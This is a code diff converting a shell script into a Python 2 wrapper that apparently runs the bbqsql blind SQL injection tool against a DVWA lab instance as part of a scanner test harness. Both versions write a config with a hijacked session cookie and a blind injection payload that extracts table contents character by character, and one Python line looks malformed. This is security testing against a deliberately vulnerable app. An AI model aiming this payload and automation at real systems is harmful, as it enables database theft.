@@ -1,29 +1,36 @@
-#!/bin/sh
-./authenticate-dvwa
+#!/usr/bin/env python
+from jonathans_scanner import jonathans_scanner
 
-#make a bbqsql config with this cookie info in it and some other options
+def main():
 
-session_id=`grep PHPSESSID < cookie.txt | awk '{print $7}'`
-urllist=$(cat urllist.txt)
-for url in $urllist; do
+    name = 'bbqsql'
 
-    echo -n "[Request Config]\n" > bbqsql.conf
-    echo -n "url = $url\n" >> bbqsql.conf
-    echo -n "method = POST\n" >> bbqsql.conf
-    echo -n 'cookies = "security=low;PHPSESSID='$session_id'"\n' >> bbqsql.conf
-    echo -n 'proxies = {"http": "127.0.0.1:8080","https": "127.0.0.1:8080"}\n' >> bbqsql.conf
+    scanner = jonathans_scanner(name)
 
-    echo -n "\n" >> bbqsql.conf
-    echo -n "[HTTP Config]\n" >> bbqsql.conf
-    echo -n 'query = " and ASCII(SUBSTR((SELECT data FROM data LIMIT 1 OFFSET ${row_index:1}),${char_index:1},1))${comparator:>}${char_val:0} "\n' >> bbqsql.conf
-    echo -n "technique = binary_search\n" >> bbqsql.conf
-    echo -n "comparison_attr = size\n" >> bbqsql.conf
-    echo -n "concurrency = 30\n" >> bbqsql.conf
-    echo -n "csv_output_file = reports/bbqsql-output.csv\n" >> bbqsql.conf
+    for url in scanner.urls:
+        print url
+        base_url = url[:url.find('?')]
+        #bbqsql takes input from a config file, we'll generate it here
+        with open('bbqsql.conf', "w") as configfile:
+            print >> configfile, "[Request Config]\n" 
+            print >> configfile, "url = " + url + "\n"
+            print >> configfile, "method = POST\n"
+            print >> configfile, 'cookies = "security=low;PHPSESSID=' + scanner.session_id + '"\n'
+            print >> configfile, 'proxies = {"http": "127.0.0.1:8080","https": "127.0.0.1:8080"}\n'
 
-    bbqsql -c bbqsql.conf
+            print >> configfile, "\n"
+            print >> configfile, "[HTTP Config]\n"
+            print >> configfile, 'query = " and ASCII(SUBSTR((SELECT data FROM data LIMIT 1 OFFSET ${row_index:1}),${char_index:1},1))${comparator:>}${char_val:0} "\n' >> bbqsql.conf
+            print >> configfile, "technique = binary_search\n"
+            print >> configfile, "comparison_attr = size\n"
+            print >> configfile, "concurrency = 30\n"
+            print >> configfile, "csv_output_file = "+  scanner.reports +"/bbqsql-output.csv\n"
 
-done
+        cmd = ['bbqsql', '-c', 'bbqsql.conf']
+        cmd = ' '.join(cmd)
 
-./cleanup
-rm bbqsql.conf
+        test = scanner.begin(cmd)
+
+if __name__ == '__main__':
+    main()
+
